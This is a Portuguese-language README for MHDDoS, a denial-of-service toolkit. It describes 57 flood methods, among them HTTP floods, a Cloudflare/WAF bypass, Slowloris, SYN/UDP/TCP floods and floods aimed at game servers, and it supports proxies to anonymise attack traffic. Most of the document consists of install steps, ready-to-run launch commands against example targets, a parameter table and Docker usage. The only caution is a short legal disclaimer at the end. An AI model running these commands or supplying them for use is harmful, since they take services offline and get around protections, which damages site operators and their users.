# MHDDoS — DDoS Attack Script With 57 Methods

## Como funciona

MHDDoS é um dos toolkits de stress test mais completos disponíveis. Suporta **57 métodos** de ataque divididos em:

**Layer 7 (HTTP/HTTPS):**
- `GET`, `POST`, `HEAD`, `NULL` — floods HTTP básicos
- `BYPASS` — bypass de proteções Cloudflare/WAF
- `DGB`, `AVB`, `STRESS` — métodos avançados com proxies
- `SLOW` — Slowloris
- `CFBUAM`, `APACHE`, `XMLRPC` — exploits específicos

**Layer 4 (TCP/UDP):**
- `TCP`, `UDP`, `SYN`, `ACK`, `ICMP`
- `MINECRAFT`, `MCBOT` — flood específico para servidores Minecraft
- `VSE` — flood para servidores de jogos (Valve Source Engine)
- `FIVEM`, `TS3`, `DISCORD` — protocolos específicos

**Proxies:** suporta HTTP, SOCKS4 e SOCKS5 para anonimizar o tráfego.

## Dependências

```bash
pip install -r requirements.txt
# Principais: cloudscraper, requests, dnspython, impacket, psutil, icmplib
```

> **Nota:** `pyroxy` é instalado direto do GitHub via pip. Requer git instalado.

## Como instalar

```bash
cd mhddos/
pip install -r requirements.txt
```

## Como usar

```bash
# Sintaxe geral
python3 start.py <MÉTODO> <URL/IP:PORTA> <threads> <proxytype> <proxies> <rpc> <duração> [tamanho_pacote]

# HTTP GET flood — 100 threads, sem proxy, 1000 req/conn, 60 segundos
python3 start.py GET http://192.168.1.100 100 0 0 1000 60

# BYPASS (anti-Cloudflare) — 50 threads, proxies HTTP, 500 req/conn, 120s
python3 start.py BYPASS http://alvo.com 50 1 proxies/http.txt 500 120

# TCP flood — 100 threads, 60 segundos, pacotes de 1024 bytes
python3 start.py TCP 192.168.1.100:80 100 0 0 100 60 1024

# UDP flood
python3 start.py UDP 192.168.1.100:80 100 0 0 100 60 1024

# SYN flood (requer root)
sudo python3 start.py SYN 192.168.1.100:80 100 0 0 100 60

# Slowloris
python3 start.py SLOW http://192.168.1.100 100 0 0 100 60
```

## Parâmetros posicionais

| Posição | Nome | Descrição |
|---------|------|-----------|
| 1 | MÉTODO | Nome do método (GET, TCP, UDP, SYN...) |
| 2 | ALVO | URL completa ou IP:porta |
| 3 | threads | Número de threads |
| 4 | proxytype | 0=sem proxy, 1=HTTP, 4=SOCKS4, 5=SOCKS5 |
| 5 | proxies | Caminho do arquivo de proxies ou 0 |
| 6 | rpc | Requisições por conexão |
| 7 | duração | Tempo em segundos |
| 8 | tamanho | Tamanho do pacote em bytes (L4 apenas) |

## Arquivo de proxies

O arquivo `files/proxies/http.txt` já vem incluído (pode estar vazio). Formato:
```
ip:porta
ip:porta:usuario:senha
```

## Estrutura do projeto

```
mhddos/
├── start.py            # Ponto de entrada
├── requirements.txt
├── config.json         # Configurações
├── Dockerfile          # Para rodar em container
├── docker-compose.yml
└── files/
    ├── proxies/
    │   └── http.txt    # Lista de proxies HTTP
    ├── referers.txt    # Referers aleatórios
    └── useragent.txt   # User-agents aleatórios
```

## Rodar com Docker (recomendado)

```bash
# Build
docker build -t mhddos .

# Rodar
docker run mhddos GET http://192.168.1.100 100 0 0 1000 60
```

## ⚠️ Aviso Legal

Use **somente em ambientes que você tem autorização**. Métodos SYN/TCP raw requerem root. Nunca use contra sistemas de terceiros.
